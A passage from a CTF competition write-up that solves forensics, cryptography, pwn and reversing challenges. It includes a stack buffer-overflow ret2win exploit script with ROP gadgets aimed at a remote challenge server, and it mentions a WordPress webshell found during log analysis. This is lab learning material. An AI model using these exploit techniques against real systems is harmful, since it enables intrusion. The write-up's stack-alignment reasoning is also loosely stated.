 "password_hash": "181a53ef753248973beaa07cdbdb2ddc2ea39623625ed598959efc5dea8c57ed"
```

Flag: `prelim{181a53ef753248973beaa07cdbdb2ddc2ea39623625ed598959efc5dea8c57ed}`

## \[5\] **- Persistent**

While checking the `/var/log/apache2/access.log`

![](https://www.notion.so/image/attachment%3A53b70844-a299-4dbd-b89d-bdb99fa7826c%3Aimage.png?table=block&id=22026e60-5e7e-8062-84fe-ec2d73c7c628&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

Upon looking at `/themes/twentytwentyfour` folder inside the wordpress, a suspicious php file exist named `themes.php` which contains a mini webshell.

![](https://www.notion.so/image/attachment%3Ab140f2b6-884c-4cfe-a7bf-db8c352e2957%3Aimage.png?table=block&id=22026e60-5e7e-8057-8414-d4a08a695294&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

The other solution is to scan the webserver using Thor.

Flag: `prelim{b4yuf3dr4_m1n1_web5h3ll_p3rs15t3nt}`

---

# **Cryptography**

## **Mindfulness**

(Gpt moment) . Decrypt RSA ciphertext using `d = d2 // 2`, recover `flag1 = pow(c, d, n)`, compute totient(flag1) as `XOR key to decrypt flag2`, then combine both parts to get the full flag.

```
from Crypto.Util.number import *
from sympy import totient

# Given values
c = 1090697257161681827338467372494237015524155841340205972141075438006486846235352812783606709214148871185568742706572950302594682835091151613629583124470212
d2 = 254190669315237659611656690873708283358313610476086281934479967762596603847181139118237009352408165213690516418963820794025807833788636490463597342510978964539012058693650957672644126092209239984585008351285329298831383304909055869506337791818181897336451413249560522009872200579635743470347341120977330484037546
n = 12772669759377422294285933457739305980370839455903351269835559814487644603035708044745452752384246167635593205134222890220262680226322097808123273638439889
part2 = 3036467688395429171878582378698544047639776291041683854137816180801927641124603773

# Step 1: Get private exponent
d = d2 // 2

# Step 2: Decrypt RSA
m = pow(c, d, n)
flag1 = long_to_bytes(m)

# Step 3: Compute Euler's Totient (number of coprimes) correctly
curseed = totient(m)

# Step 4: Decrypt second half of the flag
flag2 = long_to_bytes(part2 ^ curseed)

# Step 5: Combine
flag = flag1 + flag2
print(flag.decode(errors='ignore'))  # ignore non-utf8 bytes, if any
```

Output:

```
└─$ python sol.py
prelim{just_a_warm_up_for_u_lets_finish_the_next_challs}
```

Flag: `prelim{just_a_warm_up_for_u_lets_finish_the_next_challs}`

## **Mindreader-Revenge**

The challenge presents itself as a “mind-reading” game, but it's actually a disguised subset sum problem. The server sends a session containing a list of integers `r` and a target `sum`, which are used to compute a hidden bitmask `ans` of 0s and 1s such that `sum = sum(r[i] * ans[i])`. By extracting `r` and `sum` from the session and solving the subset sum using a meet-in-the-middle algorithm, we recover the correct sequence of "yes" (1) or "no" (0) answers

```
#!/usr/bin/env python3

from pwn import *
import re
import time
import random

context.log_level = 'info'

def parse_session_data(banner_data):
    """Extract 'r' list and 'sum' from the session data."""
    log.info("Parsing session data...")

    session_start = banner_data.find("Game session: {")
    if session_start == -1:
        log.error("Session start not found")
        return None, None

    session_data = banner_data[session_start + 14:]
    brace_count = 1
    session_end = 1
    for i in range(1, len(session_data)):
        if session_data[i] == '{':
            brace_count += 1
        elif session_data[i] == '}':
            brace_count -= 1
            if brace_count == 0:
                session_end = i
                break

    content = session_data[1:session_end]

    r_match = re.search(r"'r':\s*\[([\d,\s\n]+)\]", content, re.DOTALL)
    sum_match = re.search(r"'sum':\s*(\d+)", content)

    if not r_match or not sum_match:
        log.error("Failed to extract r or sum")
        return None, None

    r_values = list(map(int, re.findall(r'\d+', r_match.group(1))))
    target_sum = int(sum_match.group(1))

    log.success(f"Parsed {len(r_values)} r values with target sum {target_sum}")
    return r_values, target_sum

def solve_subset_sum(r_values, target_sum):
    """Meet-in-the-middle subset sum solver."""
    log.info("Solving subset sum...")
    n = len(r_values)
    mid = n // 2

    left = r_values[:mid]
    right = r_values[mid:]

    left_sums = {}
    for mask in range(1 << len(left)):
        s = sum(left[i] for i in range(len(left)) if mask & (1 << i))
        left_sums[s] = [(mask >> i) & 1 for i in range(len(left))]

    for mask in range(1 << len(right)):
        s = sum(right[i] for i in range(len(right)) if mask & (1 << i))
        remaining = target_sum - s
        if remaining in left_sums:
            left_config = left_sums[remaining]
            right_config = [(mask >> i) & 1 for i in range(len(right))]
            log.success("Subset found!")
            return left_config + right_config

    log.error("No solution found.")
    return None

def main():
    host = '152.42.220.146'
    port = 51860

    io = remote(host, port)

    log.info("Receiving banner...")
    full_data = io.recvuntil(b"===" * 3, timeout=5).decode(errors='ignore')
    time.sleep(0.1)
    full_data += io.recv(timeout=1).decode(errors='ignore')

    log.info("Parsing session...")
    r_values, target_sum = parse_session_data(full_data)

    if not r_values:
        io.close()
        return

    answers = solve_subset_sum(r_values, target_sum)
    if not answers:
        io.close()
        return

    # Interactive answering (extend beyond initial r_values length)
    i = 0
    while True:
        try:
            q = io.recvuntil(b': ', timeout=5).decode()
            log.info(f"Q{i+1}: {q.strip()}")

            if i < len(answers):
                response = 'yes' if answers[i] == 1 else 'no'
            else:
                # After the main round, fallback logic — tweak as needed
                response = random.choice(['yes', 'no'])

            io.sendline(response)
            res = io.recvline().decode()
            log.info(f"A{i+1}: {res.strip()}")
            i += 1

        except EOFError:
            log.warning("Connection closed by remote host.")
            break
        except Exception as e:
            log.error(f"Error during interaction: {e}")
            break

    io.close()

if __name__ == "__main__":
    main()
```

Responding with this exact sequence during the interactive phase results in all correct guesses, revealing the flag.

![](https://www.notion.so/image/attachment%3A8e57dbe8-d249-4199-87b2-084526b22999%3Aimage.png?table=block&id=22026e60-5e7e-805d-af19-ffc026553a88&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

Flag: `prelim{minreader_master_sksksksksk}`

---

# **Binary Exploitation**

## **Baby Armageddon**

Finding the offset:

```
import subprocess
for i in range(8, 1024, 8):
    if subprocess.run(["./armageddon_device"], input="A"*i, text=True).returncode:
        print(f"Crash at {i} bytes")
        break
```

![](https://www.notion.so/image/attachment%3Ab2f90816-0575-4232-a3fc-d8c2b8cf45a2%3Aimage.png?table=block&id=22026e60-5e7e-806c-9078-cf904953c345&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

The program crash at **128**.

now the flag was at the address of `0x00401216` or the function call name `sym.armageddon`

```
└─$ r2 armageddon_device
WARN: Relocs has not been applied. Please use `-e bin.relocs.apply=true` or `-e bin.cache=true` next time
[0x00401130]> aaaa
---STRIP---
[0x00401130]> afl
---STRIP---
0x00401344    1     13 sym._fini
0x004012a5    1     62 sym.question
0x00401160    1      5 sym._dl_relocate_static_pie
0x004012e3    1     96 main
0x00401216    3    143 sym.armageddon
---STRIP---
[0x00401130]> pdf @ sym.armageddon
┌ 143: sym.armageddon ();
│           ; var uint32_t var_8h @ rbp-0x8
│           ; var int64_t var_50h @ rbp-0x50
│           ; var int64_t var_80h @ rbp-0x80
│           0x00401216      f30f1efa       endbr64
│           0x0040121a      55             push rbp
│           0x0040121b      4889e5         mov rbp, rsp
│           0x0040121e      4883ec50       sub rsp, 0x50
│           0x00401222      488d05df0d..   lea rax, [0x00402008]       ; "r"
│           0x00401229      4889c6         mov rsi, rax
│           0x0040122c      488d05d70d..   lea rax, str.flag.txt       ; 0x40200a ; "flag.txt"
│           0x00401233      4889c7         mov rdi, rax
│           0x00401236      e8d5feffff     call sym.imp.fopen
```

as ROP standardize adding an 8byte of Stack alignment padding after the crash program. So it would be `128 + 8 = 136`

```
└─$ ROPgadget --binary armageddon_device --only "pop|ret|syscall|leave|call"
Gadgets information
============================================================
0x00000000004012df : call qword ptr [rax + 0xff3c3c9]
0x000000000040103e : call qword ptr [rax - 0x5e1f00d]
0x0000000000401014 : call rax
0x00000000004012e1 : leave ; ret
0x00000000004011fd : pop rbp ; ret
0x000000000040101a : ret

Unique gadgets found: 6
```

the return address would be `0x40101a`

```
from pwn import *
e = ELF('./armageddon_device')
#p=process(e.path)
p=remote('152.42.220.146',16023)

payload=p64(0x40101a)*136
payload+= p64(e.sym['armageddon'])
print(payload)
p.sendline(payload)

p.interactive()
```

Output:

![](https://www.notion.so/image/attachment%3A51aa5ce4-179d-44fe-93ca-2eb2932e4e20%3Aimage.png?table=block&id=22026e60-5e7e-8007-b1e0-f881b4931f90&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

Flag: `prelim{th1S_15_tH3_p4s5w0rD_f0r_4rm463dd0N}`

---

# **Reverse Engineering**

## **Crack Me**

Decompiling:

```
//----- (0000000140021530) ----------------------------------------------------
int __fastcall main(int argc, const char **argv, const char **envp)
{
  FILE *v3; // rax
  unsigned __int8 v5[264]; // [rsp+20h] [rbp-108h] BYREF

  sub_1400215F4();
  printf("\nCYDES 2025 Prelim EZ Challenge - @zeifan\n");
  printf("\nEnter password: ");
  v3 = _acrt_iob_func(0);
  common_fgets<char>(v5, 256, v3);
  v5[sub_14000DF40(v5, (unsigned __int8 *)asc_140001D34)] = 0;
  if ( (unsigned int)sub_140021608((__int64)v5) )
  {
    sub_14002179C((__int64)qword_140001C60, (char *)&v5[4]);
    printf("%s\n", qword_140001CA0);
  }
  else
  {
    printf("%s\n", aAccessDenied);
  }
  memset(v5, 0, 0x100u);
  sub_1400104D8((__int64)aPause);
  return 0;
}
```

on the if condition got `sub_140021608()` where it to check the condition input

```
__int64 __fastcall sub_140021608(__int64 a1)
{
  unsigned __int64 v1; // rdi
  __int64 v3; // rax
  char v4; // dl
  int v5; // ecx
  __int64 v6; // r8
  char v7; // al
  int v9; // r10d
  __int64 v10; // r9
  char *v11; // rdx
  __int64 v12; // [rsp+20h] [rbp-E0h] BYREF
  int v13; // [rsp+28h] [rbp-D8h]
  int v14; // [rsp+2Ch] [rbp-D4h]
  char Destination[16]; // [rsp+30h] [rbp-D0h] BYREF
  char v16[16]; // [rsp+40h] [rbp-C0h] BYREF
  __int128 v17; // [rsp+50h] [rbp-B0h]
  unsigned int v18[1364]; // [rsp+60h] [rbp-A0h] BYREF

  v1 = -1;
  v3 = -1;
  do
    ++v3;
  while ( *(_BYTE *)(a1 + v3) );
  if ( v3 != 20 )
    return 0;
  if ( strncmp((const char *)a1, Str2, 4u) )
    return 0;
  if ( *(_BYTE *)(a1 + 19) != 125 )
    return 0;
  *(_OWORD *)Destination = 0;
  strncpy(Destination, (const char *)(a1 + 4), 0xFu);
  if ( !(unsigned int)sub_140021C40((__int64)Destination) )
    return 0;
  memset(v18, 0, sizeof(v18));
  v4 = Destination[0];
  v5 = 0;
  v12 = 0x1010000063D0001LL;
  v13 = 66;
  v14 = -16711664;
  if ( !Destination[0] )
    return 0;
  v6 = 0;
  while ( v4 < 48 || v4 > 57 )
  {
    v7 = Destination[++v6];
    ++v5;
    v4 = v7;
    if ( !v7 )
      return 0;
  }
  v9 = v5;
  do
    ++v1;
  while ( Destination[v1] );
  v10 = v5;
  if ( v5 < v1 )
  {
    v11 = &Destination[v6];
    do
    {
      if ( (unsigned __int8)(*v11 - 48) > 9u )
        break;
      ++v5;
      ++v11;
    }
    while ( v5 < v1 );
  }
  *(_OWORD *)v16 = 0;
  v17 = 0;
  strncpy(v16, &Destination[v10], v5 - v9);
  if ( (unsigned int)unknown_libname_23(v16) == 1597
    && (*(_DWORD *)((char *)&v12 + 2) = 1597, (unsigned int)sub_14002192C(v18, (__int64)&v12) == 1597) )
  {
    return 1;
  }
  else
  {
    return 0;
  }
}
```

The next section. It looks for a number inside these 15 bytes.

```
strncpy(Destination, a1+4, 0xF); // copy 15 bytes after prefix
```

Validates that number using a call:

```
unknown_libname_23(v16) == 1597
```

And verifies, so the number would be `1597`:

```
sub_140021C40(Destination)
sub_14002192C(v18, &v12) == 1597
```

Other than that there’s also:

```
char Str2[] = "CTF{"; // idb
```

Exact telling on how to solve:

**How To Solve:**

1. **Find** `Str2` **value** (first 4 characters) \[which was ‘CTF{’\].
1. **Disassembler or reverse** number string `Y` so:
  - `unknown_libname_23(Y) == 1597`
  - `sub_140021C40(Y) == 1`
  - `sub_14002192C(...) == 1597`
1. Construct password: `Str2 + Y + '}'`
1. Input into binary → output will be the flag.

```
PS C:\Users\Lolin\Downloads> .\crackmes.exe

CYDES 2025 Prelim EZ Challenge - @zeifan

Enter password: CTF{1597}
Congratulations! Flag: prelim{f0r_7h3_p0w3r_0f_10v3}
Press any key to continue . . .
```

Flag: `prelim{f0r_7h3_p0w3r_0f_10v3}`

---
